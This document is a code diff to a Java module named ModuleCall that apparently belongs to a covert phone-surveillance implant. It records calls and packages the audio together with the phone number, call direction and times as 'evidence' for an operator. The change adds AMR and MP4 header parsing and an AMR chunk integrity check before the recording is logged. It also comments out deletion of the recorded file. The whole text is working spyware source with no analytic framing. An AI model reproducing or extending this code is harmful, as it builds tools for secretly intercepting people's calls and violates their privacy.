@@ -46,6 +46,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private DateTime from;
 	private String number;
 
+	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
+	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
+	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
+
 	@Override
 	public boolean parse(ConfModule conf) {
 		if (conf.has("record")) {
@@ -177,25 +181,86 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		final byte[] additionaldata = getCallAdditionalData(number, incoming, from, to);
 
 		AutoFile file = new AutoFile(currentRecordFile);
-		if (file.exists() && file.getSize() > 5 && file.canRead()) {
+		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
 			}
-			//byte[] data = file.read(HEADER_SIZE);
-			byte[] data = file.read();
-			
+
+			int offset = 0;
+			byte[] header = file.read(0, 6);
+
+			if (Utils.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveCallEvidence): AMR header");
+				}
+				offset = AMR_HEADER.length;
+			}
+			if (Utils.equals(header, 0, MP4_HEADER, 0, MP4_HEADER.length)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveCallEvidence): MP4 header");
+				}
+				offset = 0x28;
+				// wide -> moov
+			}
+
+			byte[] data = file.read(offset);
+			int pos = checkIntegrity(data);
+			if (pos != data.length) {
+				data = Utils.copy(data, 0, pos);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): data " + data.length);
+				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
+				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + Utils.byteArrayToHex(data).substring(0, 20));
 			}
 			new LogR(EvidenceType.CALL, additionaldata, data);
 			new LogR(EvidenceType.CALL, additionaldata, Utils.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): deleting file");
+				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
 			}
-			file.delete();
+			// file.delete();
 		}
 
+	}
+
+	private int checkIntegrity(byte[] data) {
+		int pos = 0;
+		int chunklen = 0;
+		int termPos = Integer.MAX_VALUE;
+		byte[] term = new byte[] { 'm', 'o', 'o', 'v' };
+
+		for (int i = 0; i < (data.length - term.length) && i< termPos; i++) {
+			boolean found = true;
+			if (Utils.equals(data, i, term, 0, term.length)) {
+
+				termPos = i - 1;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (checkIntegrity): term pos: " + termPos + " to the end: "
+							+ (data.length - termPos));
+				}
+				break;
+
+			}
+		}
+		
+		while (pos < data.length && pos < termPos) {			
+			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
+			if (chunklen == 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
+				}
+			}
+			pos += chunklen + 1;
+			if (false && Cfg.DEBUG) {
+				Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " chunklen = " + chunklen);
+			}
+		} 
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkIntegrity): end");
+		}
+		return pos;
 	}
 
 	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime from, DateTime to) {
